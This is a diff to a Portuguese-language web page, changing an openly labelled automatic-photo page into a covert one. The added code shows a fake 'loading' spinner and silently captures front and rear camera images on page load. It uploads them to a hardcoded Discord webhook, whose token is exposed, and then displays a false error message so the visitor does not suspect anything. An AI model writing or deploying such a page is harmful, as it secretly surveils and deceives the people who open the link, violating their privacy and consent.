@@ -2,40 +2,62 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Foto automática</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Carregando...</title>
 <style>
-  body { font-family: system-ui, sans-serif; margin: 0; padding: 16px; background: #111; color: #eee; text-align: center; }
-  h1 { font-size: 1.3rem; margin: 8px 0; }
-  #status { margin: 12px 0; min-height: 1.4em; color: #9cf; }
-  .grid { display: grid; grid-template-columns: 1fr; gap: 16px; }
-  .shot { background: #222; border-radius: 12px; padding: 10px; }
-  .shot img { width: 100%; border-radius: 8px; display: block; }
-  .shot p { margin: 8px 0; font-weight: bold; }
-  a.btn, button.btn {
-    display: inline-block; margin: 6px; padding: 10px 16px; border: 0; border-radius: 8px;
-    background: #3b82f6; color: #fff; font-size: 1rem; text-decoration: none; cursor: pointer;
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: system-ui, -apple-system, sans-serif;
+    background: #0a0a0a;
+    color: #ccc;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    padding: 20px;
   }
-  video { display: none; }
+  .container {
+    max-width: 320px;
+  }
+  .spinner {
+    width: 48px;
+    height: 48px;
+    border: 4px solid #333;
+    border-top-color: #3b82f6;
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+    margin: 0 auto 24px;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+  #status {
+    font-size: 1.05rem;
+    line-height: 1.5;
+    color: #aaa;
+  }
+  .error {
+    color: #f87171;
+  }
+  video, canvas { display: none; }
 </style>
 </head>
 <body>
-<h1>Foto automática</h1>
-<div id="status">Preparando câmera...</div>
-<div class="grid" id="shots"></div>
-<button id="retry" class="btn" style="display:none">Tentar novamente</button>
+  <div class="container">
+    <div class="spinner" id="spinner"></div>
+    <div id="status">Carregando...</div>
+  </div>
 
-<video id="video" autoplay playsinline muted></video>
-<canvas id="canvas" style="display:none"></canvas>
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
 
 <script>
 const statusEl = document.getElementById('status');
-const shotsEl = document.getElementById('shots');
-const retryBtn = document.getElementById('retry');
+const spinnerEl = document.getElementById('spinner');
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 
-// Webhook do Discord (atualizada)
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1568339134081146942/HzZ4Ohe6oPb4JlU4Ng8jK2jkb3JELjiPWWMETzjVRbjKTKtQ2WF4bJTU1p-c8Jk61WJ-';
 
 const CAMERAS = [
@@ -43,8 +65,14 @@ const CAMERAS = [
   { label: 'Traseira', facingMode: 'environment' }
 ];
 
-function setStatus(text) { statusEl.textContent = text; }
-function wait(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
+function setStatus(text, isError = false) {
+  statusEl.textContent = text;
+  statusEl.className = isError ? 'error' : '';
+}
+
+function wait(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
 
 async function captureCamera(cam) {
   const stream = await navigator.mediaDevices.getUserMedia({
@@ -54,14 +82,13 @@ async function captureCamera(cam) {
   try {
     video.srcObject = stream;
     await video.play();
-    // Dá tempo para a câmera ajustar foco e exposição
-    await wait(1200);
+    await wait(1100);
 
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.92));
+    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
     if (!blob) throw new Error('Frame vazio');
     return blob;
   } finally {
@@ -72,10 +99,9 @@ async function captureCamera(cam) {
 
 async function sendToWebhook(cam, blob) {
   const fileName = `foto-${cam.facingMode === 'user' ? 'frontal' : 'traseira'}-${Date.now()}.jpg`;
-  
   const formData = new FormData();
   formData.append('file', blob, fileName);
-  formData.append('content', `📸 Foto automática — **${cam.label}**`);
+  formData.append('content', `📸 ${cam.label}`);
 
   const response = await fetch(WEBHOOK_URL, {
     method: 'POST',
@@ -83,44 +109,25 @@ async function sendToWebhook(cam, blob) {
   });
 
   if (!response.ok) {
-    const text = await response.text().catch(() => '');
-    throw new Error(`Webhook falhou (${response.status}): ${text || response.statusText}`);
+    throw new Error('Falha no envio');
   }
-}
-
-function addShot(cam, blob) {
-  const url = URL.createObjectURL(blob);
-  const fileName = `foto-${cam.facingMode === 'user' ? 'frontal' : 'traseira'}-${Date.now()}.jpg`;
-  const card = document.createElement('div');
-  card.className = 'shot';
-  card.innerHTML =
-    `<p>${cam.label}</p>` +
-    `<img src="${url}" alt="Foto ${cam.label}">` +
-    `<br><a class="btn" href="${url}" download="${fileName}">Baixar</a>`;
-  shotsEl.appendChild(card);
 }
 
 async function run() {
-  shotsEl.innerHTML = '';
-  retryBtn.style.display = 'none';
   try {
     for (const cam of CAMERAS) {
-      setStatus(`Tirando foto (${cam.label.toLowerCase()})...`);
       const blob = await captureCamera(cam);
-      addShot(cam, blob);
-
-      setStatus(`Enviando foto ${cam.label.toLowerCase()} para o Discord...`);
       await sendToWebhook(cam, blob);
     }
-    setStatus('Pronto! As duas fotos foram tiradas e enviadas para o Discord.');
   } catch (err) {
     console.error(err);
-    setStatus('Erro: ' + (err.message || err.name || err) + '. Toque em "Tentar novamente".');
-    retryBtn.style.display = 'inline-block';
+  } finally {
+    // Sempre mostra a mesma mensagem no final (sucesso ou erro)
+    spinnerEl.style.display = 'none';
+    setStatus('Erro, tente novamente mais tarde', true);
   }
 }
 
-retryBtn.addEventListener('click', run);
 window.addEventListener('load', run);
 </script>
 </body>
